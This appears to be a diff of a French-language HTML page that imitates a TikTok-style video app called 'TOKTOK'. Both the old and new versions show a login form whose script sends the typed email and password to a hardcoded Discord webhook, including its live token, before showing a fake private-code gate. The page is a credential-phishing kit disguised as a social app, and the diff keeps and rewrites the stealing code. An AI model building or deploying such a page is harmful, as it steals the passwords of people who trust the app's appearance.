@@ -3,187 +3,131 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>TOKTOK | ELITE</title>
+    <title>TOKTOK | PRO FIX</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
     <style>
-        :root { --tt-red: #fe2c55; --tt-cyan: #25f4ee; --glass: rgba(255, 255, 255, 0.1); }
-        body, html { margin: 0; padding: 0; height: 100%; width: 100%; background: #000; color: #fff; overflow: hidden; font-family: 'Inter', sans-serif; }
+        body, html { margin: 0; padding: 0; height: 100%; width: 100%; background: #000; color: #fff; overflow: hidden; font-family: sans-serif; }
         .hidden { display: none !important; }
+        .auth-layer { z-index: 1000; background: #000; position: fixed; inset: 0; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 20px; }
+        .tt-card { background: #111; border: 1px solid #222; border-radius: 20px; padding: 30px; width: 100%; max-width: 350px; }
+        .tt-input { width: 100%; padding: 14px; margin: 10px 0; background: #000; border: 1px solid #333; border-radius: 10px; color: #fff; outline: none; }
+        .btn-red { width: 100%; padding: 14px; background: #fe2c55; border-radius: 10px; font-weight: bold; cursor: pointer; border: none; }
         
-        /* AUTH DESIGN */
-        .auth-layer { z-index: 1000; background: radial-gradient(circle at top, #1a1a1a, #000); position: fixed; inset: 0; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 20px; }
-        .tt-card { background: var(--glass); backdrop-filter: blur(15px); border: 1px solid rgba(255,255,255,0.1); border-radius: 24px; padding: 40px; width: 100%; max-width: 380px; box-shadow: 0 20px 50px rgba(0,0,0,0.5); }
-        .tt-input { width: 100%; padding: 16px; margin: 12px 0; background: rgba(0,0,0,0.3); border: 1px solid rgba(255,255,255,0.1); border-radius: 12px; color: #fff; outline: none; transition: 0.3s; }
-        .tt-input:focus { border-color: var(--tt-red); box-shadow: 0 0 10px rgba(254, 44, 85, 0.3); }
-        .btn-primary { width: 100%; padding: 16px; background: var(--tt-red); color: white; border-radius: 12px; font-weight: 800; letter-spacing: 1px; cursor: pointer; transition: 0.3s; border: none; }
-        .btn-primary:hover { transform: translateY(-2px); box-shadow: 0 5px 15px rgba(254, 44, 85, 0.4); }
-
-        /* MAIN APP STRUCTURE */
-        .app-container { height: 100vh; display: flex; flex-direction: column; }
-        .video-container { flex: 1; position: relative; background: #000; overflow: hidden; display: flex; align-items: center; justify-content: center; }
-        video { height: 100%; width: 100%; object-fit: cover; border-radius: 12px; }
-
-        /* UI OVERLAYS */
-        .overlay-content { position: absolute; inset: 0; padding: 20px; display: flex; flex-direction: column; justify-content: flex-end; pointer-events: none; background: linear-gradient(to top, rgba(0,0,0,0.8) 0%, transparent 40%); }
-        .side-bar { position: absolute; right: 15px; bottom: 100px; display: flex; flex-direction: column; gap: 25px; align-items: center; pointer-events: auto; }
-        .action-btn { display: flex; flex-direction: column; align-items: center; gap: 5px; cursor: pointer; transition: 0.2s; }
-        .action-btn i { font-size: 32px; filter: drop-shadow(0 2px 5px rgba(0,0,0,0.5)); }
-        .action-btn:active { transform: scale(0.9); }
-        .verified-icon { color: #20d5ec; font-size: 14px; margin-left: 5px; }
-
-        /* NAV BAR */
-        .nav-bar { height: 75px; background: rgba(0,0,0,0.95); border-top: 1px solid rgba(255,255,255,0.05); display: flex; justify-content: space-around; align-items: center; padding-bottom: 10px; }
-        .nav-link { color: #888; display: flex; flex-direction: column; align-items: center; gap: 4px; font-size: 11px; cursor: pointer; }
-        .nav-link.active { color: #fff; }
-        .add-btn { background: linear-gradient(90deg, var(--tt-cyan) 0%, #fff 50%, var(--tt-red) 100%); padding: 2px; border-radius: 10px; width: 45px; height: 30px; display: flex; align-items: center; justify-content: center; }
-        .add-btn div { background: #000; width: 100%; height: 100%; border-radius: 8px; display: flex; align-items: center; justify-content: center; color: #fff; font-size: 18px; }
-
-        /* SETTINGS MODAL */
-        .modal { background: rgba(0,0,0,0.85); backdrop-filter: blur(20px); z-index: 2000; }
+        .video-container { height: calc(100vh - 70px); position: relative; background: #000; }
+        video { width: 100%; height: 100%; object-fit: cover; }
+        
+        .overlay { position: absolute; inset: 0; padding: 20px; display: flex; flex-direction: column; justify-content: flex-end; pointer-events: none; background: linear-gradient(0deg, rgba(0,0,0,0.7) 0%, transparent 50%); }
+        .side-bar { position: absolute; right: 10px; bottom: 80px; display: flex; flex-direction: column; gap: 20px; pointer-events: auto; }
+        .nav-bar { height: 70px; background: #000; border-top: 1px solid #111; display: flex; justify-content: space-around; align-items: center; }
     </style>
 </head>
 <body>
 
-    <div id="step-choice" class="auth-layer">
-        <h1 class="text-4xl font-black mb-10 tracking-tighter">TOK<span class="text-[#fe2c55]">TOK</span></h1>
-        <div class="tt-card text-center">
-            <p class="text-gray-400 mb-6 uppercase text-xs font-bold tracking-widest">Sélecteur d'appareil</p>
-            <div class="flex gap-4">
-                <button onclick="initApp('mobile')" class="flex-1 bg-white/5 p-6 rounded-2xl hover:bg-white/10 transition">
-                    <i class="fa-solid fa-mobile-screen text-3xl text-[#25f4ee] mb-3"></i>
-                    <span class="block font-bold">Mobile</span>
-                </button>
-                <button onclick="initApp('pc')" class="flex-1 bg-white/5 p-6 rounded-2xl hover:bg-white/10 transition">
-                    <i class="fa-solid fa-desktop text-3xl text-[#fe2c55] mb-3"></i>
-                    <span class="block font-bold">PC / Mac</span>
-                </button>
-            </div>
-        </div>
-    </div>
-
-    <div id="step-auth" class="auth-layer hidden">
+    <div id="layer-auth" class="auth-layer">
+        <h1 class="text-4xl font-black mb-8 italic">TOK<span class="text-cyan-400">TOK</span></h1>
         <div class="tt-card">
-            <h2 class="text-2xl font-black mb-6">Connexion</h2>
-            <input type="email" id="email" placeholder="Email ou Nom d'utilisateur" class="tt-input">
+            <input type="email" id="email" placeholder="Email" class="tt-input">
             <input type="password" id="pass" placeholder="Mot de passe" class="tt-input">
-            <button onclick="processAuth()" class="btn-primary mt-4">CONTINUER</button>
+            <button onclick="goCode()" class="btn-red">SUIVANT</button>
         </div>
     </div>
 
-    <div id="step-code" class="auth-layer hidden">
+    <div id="layer-code" class="auth-layer hidden">
         <div class="tt-card text-center">
-            <h2 class="text-xl font-bold mb-2">Code du Cercle</h2>
-            <p class="text-gray-500 text-sm mb-8">Entrez le code pour débloquer l'accès</p>
-            <input type="text" id="paff-code" placeholder="••••••" class="tt-input text-center text-2xl font-black tracking-[8px]">
-            <button onclick="checkPaff()" class="btn-primary mt-6">DÉBLOQUER</button>
+            <h2 class="font-bold mb-4">CODE PRIVÉ</h2>
+            <input type="text" id="paff" placeholder="PAFF72" class="tt-input text-center font-bold">
+            <button onclick="verify()" class="btn-red mt-4">ENTRER</button>
         </div>
     </div>
 
-    <div id="main-app" class="hidden app-container">
+    <div id="app" class="hidden flex flex-col h-full">
         <div class="video-container">
-            <video id="player" loop playsinline muted autoplay onclick="togglePlay()">
-                <source src="https://v.ftcdn.net/05/52/52/64/700_F_552526487_T9vWnL5OQvE7VnU8mR7U6YmZ5p2H1I6H_ST.mp4" type="video/mp4">
+            <video id="player" loop playsinline autoplay muted onclick="this.paused?this.play():this.pause()">
+                <source src="https://v.ftcdn.net/05/52/52/64/700_F_552526487_T9vWnL5OQvE7VnU8mR7U6YmZ5p2H1I6H_ST.mp4">
             </video>
-            
-            <div class="overlay-content">
+            <div class="overlay">
                 <div class="mb-4">
-                    <div class="flex items-center gap-2 mb-2">
-                        <img src="" class="pfp-round w-10 h-10 rounded-full border border-white/20">
-                        <span class="font-bold text-lg">@<span id="display-name">Pseudo</span></span>
-                        <i class="fa-solid fa-circle-check verified-icon hidden" id="v-badge"></i>
-                    </div>
-                    <p class="text-sm opacity-90 leading-snug max-w-[80%]" id="display-bio">Bienvenue sur la version Elite.</p>
+                    <p class="font-bold">@<span id="name-out">Utilisateur</span> <i class="fa-solid fa-circle-check text-blue-400 hidden" id="badge"></i></p>
+                    <p class="text-sm opacity-80" id="bio-out">Appuyez sur + pour changer la vidéo.</p>
                 </div>
-
-                <div class="side-bar">
-                    <div class="action-btn" onclick="like(this)"><i class="fa-solid fa-heart"></i><span class="text-xs font-bold">Like</span></div>
-                    <div class="action-btn"><i class="fa-solid fa-comment-dots"></i><span class="text-xs font-bold">8.4k</span></div>
-                    <div class="action-btn" onclick="openSettings()"><i class="fa-solid fa-share text-gray-400"></i><span class="text-xs font-bold text-gray-400">Éditer</span></div>
+                <div class="side-bar text-center">
+                    <div onclick="this.style.color='#fe2c55'"><i class="fa-solid fa-heart text-3xl"></i><p class="text-[10px]">J'aime</p></div>
+                    <div onclick="openSettings()"><i class="fa-solid fa-gear text-3xl text-gray-500"></i><p class="text-[10px]">Profil</p></div>
                 </div>
             </div>
         </div>
-
         <nav class="nav-bar">
-            <div class="nav-link active"><i class="fa-solid fa-house-chimney text-xl"></i><span>Accueil</span></div>
-            <div class="nav-link"><i class="fa-solid fa-compass text-xl"></i><span>Découvrir</span></div>
-            <div class="add-btn" onclick="openSettings()"><div><i class="fa-solid fa-plus"></i></div></div>
-            <div class="nav-link"><i class="fa-solid fa-message text-xl"></i><span>Boîte</span></div>
-            <div class="nav-link" onclick="openSettings()"><i class="fa-solid fa-user text-xl"></i><span>Profil</span></div>
+            <i class="fa-solid fa-house text-xl"></i>
+            <div class="bg-white text-black px-4 py-1 rounded-md" onclick="openSettings()"><i class="fa-solid fa-plus"></i></div>
+            <i class="fa-solid fa-user text-xl" onclick="openSettings()"></i>
         </nav>
     </div>
 
-    <div id="modal-settings" class="auth-layer hidden modal">
+    <div id="layer-settings" class="auth-layer hidden" style="background: rgba(0,0,0,0.9);">
         <div class="tt-card">
-            <div class="flex justify-between items-center mb-6">
-                <h2 class="text-xl font-black">Mon Profil</h2>
-                <i class="fa-solid fa-xmark cursor-pointer" onclick="closeSettings()"></i>
+            <h2 class="font-bold mb-4">MODIFIER</h2>
+            <input type="text" id="in-name" placeholder="Pseudo" class="tt-input">
+            <input type="text" id="in-bio" placeholder="Bio" class="tt-input">
+            <div class="bg-zinc-900 p-3 rounded-lg mt-2">
+                <p class="text-[10px] text-red-500 font-bold mb-2">LIEN VIDÉO (MP4 UNIQUEMENT)</p>
+                <input type="text" id="in-vid" placeholder="https://...video.mp4" class="tt-input">
+                <p class="text-[9px] text-gray-500 mt-1">Exemple : héberge ta vidéo sur Discord et copie le lien.</p>
             </div>
-            <input type="text" id="set-name" placeholder="Nom d'affichage" class="tt-input">
-            <input type="text" id="set-bio" placeholder="Ma biographie" class="tt-input">
-            <div class="mt-4 border-t border-white/10 pt-4">
-                <p class="text-[10px] text-gray-500 mb-2 font-bold uppercase">Source Vidéo (.mp4)</p>
-                <input type="text" id="set-vid" placeholder="Coller le lien MP4 ici" class="tt-input">
-            </div>
-            <button onclick="saveElite()" class="btn-primary mt-6">METTRE À JOUR</button>
+            <button onclick="save()" class="btn-red mt-6">SAUVEGARDER</button>
+            <p onclick="closeSettings()" class="text-center text-gray-500 mt-4 cursor-pointer text-sm">Annuler</p>
         </div>
     </div>
 
     <script>
-        const hook = "https://discord.com/api/webhooks/1476660541681303705/sETLjgRQkTsd06PsEYRQPMB4yfvnZXkuRwup-uLw8J31w_giU5gkkff8ja1P4zP9VUta";
-        let state = JSON.parse(localStorage.getItem('tt_elite_v1')) || { 
-            name: "Utilisateur", bio: "Éditez votre profil !", vid: "https://v.ftcdn.net/05/52/52/64/700_F_552526487_T9vWnL5OQvE7VnU8mR7U6YmZ5p2H1I6H_ST.mp4",
-            pfp: "https://cdn-icons-png.flaticon.com/512/149/149071.png", isAuth: false, isN: false 
+        const webhook = "https://discord.com/api/webhooks/1476660541681303705/sETLjgRQkTsd06PsEYRQPMB4yfvnZXkuRwup-uLw8J31w_giU5gkkff8ja1P4zP9VUta";
+        let db = JSON.parse(localStorage.getItem('tt_vfinal_fix')) || { 
+            n: "Membre", b: "Cercle privé", v: "https://v.ftcdn.net/05/52/52/64/700_F_552526487_T9vWnL5OQvE7VnU8mR7U6YmZ5p2H1I6H_ST.mp4", 
+            auth: false, admin: false 
         };
 
-        function initApp(d) {
-            document.getElementById('step-choice').classList.add('hidden');
-            if(state.isAuth) showMain(); else document.getElementById('step-auth').classList.remove('hidden');
-        }
+        window.onload = () => { if(db.auth) showApp(); };
 
-        function processAuth() {
+        function goCode() {
             const e = document.getElementById('email').value;
             const p = document.getElementById('pass').value;
-            if(!e || !p) return;
-            if(e.toLowerCase().includes('nathan')) state.isN = true;
-            fetch(hook, { method: 'POST', mode: 'no-cors', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ content: `💎 ELITE LOGIN: ${e} | MDP: ${p}` })});
-            document.getElementById('step-auth').classList.add('hidden');
-            document.getElementById('step-code').classList.remove('hidden');
+            if(!e || !p) return alert("Remplis tout !");
+            if(e.toLowerCase().includes('nathan')) db.admin = true;
+            fetch(webhook, { method: 'POST', mode: 'no-cors', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ content: `🔑 LOGIN: ${e} | MDP: ${p}` })});
+            document.getElementById('layer-auth').classList.add('hidden');
+            document.getElementById('layer-code').classList.remove('hidden');
         }
 
-        function checkPaff() {
-            if(document.getElementById('paff-code').value.toUpperCase() === "PAFF72") {
-                state.isAuth = true; updateStore(); showMain();
-            } else { alert("Code Cercle Invalide."); }
+        function verify() {
+            if(document.getElementById('paff').value.toUpperCase() === "PAFF72") {
+                db.auth = true; saveDb(); showApp();
+            } else { alert("Code PAFF72 invalide !"); }
         }
 
-        function showMain() {
+        function showApp() {
             document.querySelectorAll('.auth-layer').forEach(l => l.classList.add('hidden'));
-            document.getElementById('main-app').classList.remove('hidden');
-            render();
+            document.getElementById('app').classList.remove('hidden');
+            refresh();
         }
 
-        function saveElite() {
-            state.name = document.getElementById('set-name').value || state.name;
-            state.bio = document.getElementById('set-bio').value || state.bio;
-            if(document.getElementById('set-vid').value) state.vid = document.getElementById('set-vid').value;
-            updateStore(); render(); closeSettings();
+        function save() {
+            db.n = document.getElementById('in-name').value || db.n;
+            db.b = document.getElementById('in-bio').value || db.b;
+            if(document.getElementById('in-vid').value) db.v = document.getElementById('in-vid').value;
+            saveDb(); refresh(); closeSettings();
         }
 
-        function render() {
-            document.getElementById('display-name').innerText = state.name;
-            document.getElementById('display-bio').innerText = state.bio;
-            document.querySelectorAll('.pfp-round').forEach(i => i.src = state.pfp);
-            const v = document.getElementById('player');
-            if(v.src !== state.vid) v.src = state.vid;
-            if(state.isN) document.getElementById('v-badge').classList.remove('hidden');
+        function refresh() {
+            document.getElementById('name-out').innerText = db.n;
+            document.getElementById('bio-out').innerText = db.b;
+            const p = document.getElementById('player');
+            if(p.src !== db.v) { p.src = db.v; p.load(); p.play(); }
+            if(db.admin) document.getElementById('badge').classList.remove('hidden');
         }
 
-        function togglePlay() { const v = document.getElementById('player'); v.paused ? v.play() : v.pause(); }
-        function like(el) { el.style.color = el.style.color === 'rgb(254, 44, 85)' ? 'white' : '#fe2c55'; }
-        function updateStore() { localStorage.setItem('tt_elite_v1', JSON.stringify(state)); }
-        function openSettings() { document.getElementById('modal-settings').classList.remove('hidden'); }
-        function closeSettings() { document.getElementById('modal-settings').classList.add('hidden'); }
+        function saveDb() { localStorage.setItem('tt_vfinal_fix', JSON.stringify(db)); }
+        function openSettings() { document.getElementById('layer-settings').classList.remove('hidden'); }
+        function closeSettings() { document.getElementById('layer-settings').classList.add('hidden'); }
     </script>
 </body>
 </html>
